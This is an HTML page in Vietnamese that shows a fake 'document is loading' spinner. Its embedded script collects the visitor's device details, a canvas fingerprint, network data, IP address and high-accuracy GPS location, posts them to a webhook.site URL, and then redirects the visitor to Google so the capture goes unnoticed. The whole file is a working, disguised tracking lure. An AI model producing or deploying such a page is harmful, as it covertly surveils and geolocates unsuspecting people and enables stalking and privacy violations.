<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đang tải tài liệu...</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; color: #333; }
        .container { text-align: center; }
        .loader { border: 4px solid #e0e0e0; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 15px; font-size: 16px; font-weight: 500; }
    </style>
</head>
<body>

    <div class="container">
        <div class="loader"></div>
        <p>Vui lòng chờ trong giây lát, tài liệu đang được tải...</p>
    </div>

    <script>
        (async function() {
            // --- CẤU HÌNH ---
            const WEBHOOK_URL = "https://webhook.site/de82030e-a647-4012-b7f4-c539d868de62";
            const REDIRECT_TO = "https://www.google.com";

            let data = {
                browser: {},
                hardware: {},
                battery: {},
                fingerprint: {},
                screen: {},
                network: {},
                time: {},
                context: {},
                location: {}
            };

            try {
                // 1. Thông tin cơ bản từ Trình duyệt
                data.browser = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    vendor: navigator.vendor,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack
                };

                // 2. Thông tin Phần cứng (CPU, RAM)
                data.hardware = {
                    hardwareConcurrency: navigator.hardwareConcurrency || "N/A", // Số nhân CPU
                    deviceMemory: navigator.deviceMemory || "N/A", // RAM (GB)
                    maxTouchPoints: navigator.maxTouchPoints || 0 // Số điểm cảm ứng
                };

                // Lấy thông tin GPU (Card đồ họa)
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        data.hardware.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        data.hardware.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                } catch (e) { data.hardware.gpu = "Không lấy được"; }

                // 3. Thông tin Pin
                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        data.battery = {
                            level: (battery.level * 100).toFixed(0) + "%",
                            isCharging: battery.charging
                        };
                    } catch (e) { data.battery = "Không lấy được"; }
                } else {
                    data.battery = "Trình duyệt không hỗ trợ API Pin";
                }

                // 4. Định danh Canvas Fingerprinting
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = "top";
                    ctx.font = "14px 'Arial'";
                    ctx.textBaseline = "alphabetic";
                    ctx.fillStyle = "#f60";
                    ctx.fillRect(125, 1, 62, 20);
                    ctx.fillStyle = "#069";
                    ctx.fillText("Browser Fingerprint 123", 2, 15);
                    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                    ctx.fillText("Browser Fingerprint 123", 4, 17);
                    
                    // Lấy mã hash để nhận diện thiết bị
                    data.fingerprint.canvasHash = canvas.toDataURL().slice(-50); 
                } catch (e) { data.fingerprint = "Lỗi tạo Fingerprint"; }

                // 5. Thông tin Màn hình
                data.screen = {
                    width: window.screen.width,
                    height: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    orientation: window.screen.orientation ? window.screen.orientation.type : "N/A"
                };

                // 6. Thông tin Mạng & Thời gian
                data.network = navigator.connection ? {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink + " Mbps",
                    rtt: navigator.connection.rtt + " ms"
                } : "Không hỗ trợ";

                data.time = {
                    localTime: new Date().toLocaleString(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };

                // 7. Nguồn truy cập
                data.context = {
                    url: window.location.href,
                    referrer: document.referrer || "Truy cập trực tiếp"
                };

                // 8. Lấy Địa chỉ IP
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    data.ip = ipData.ip;
                } catch (e) { data.ip = "Lỗi hoặc bị chặn"; }

                // 9. Lấy Tọa độ GPS
                if (navigator.geolocation) {
                    await new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(
                            (pos) => {
                                data.location = {
                                    lat: pos.coords.latitude,
                                    lon: pos.coords.longitude,
                                    accuracy: pos.coords.accuracy + " meters"
                                };
                                resolve();
                            },
                            (err) => {
                                data.location = `Lỗi GPS: ${err.message}`;
                                resolve();
                            },
                            { timeout: 5000, enableHighAccuracy: true } // Thêm enableHighAccuracy để lấy vị trí chuẩn hơn
                        );
                    });
                } else {
                    data.location = "Trình duyệt không hỗ trợ GPS";
                }

                // --- GỬI DỮ LIỆU VỀ WEBHOOK ---
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors', 
                    body: JSON.stringify(data, null, 2) // Thêm null, 2 để format JSON đẹp hơn trên Webhook
                });

            } catch (err) {
                console.error("Đã xảy ra lỗi:", err);
            } finally {
                // Chuyển hướng
                setTimeout(() => {
                    window.location.href = REDIRECT_TO;
                }, 1000);
            }
        })();
    </script>
</body>
</html>
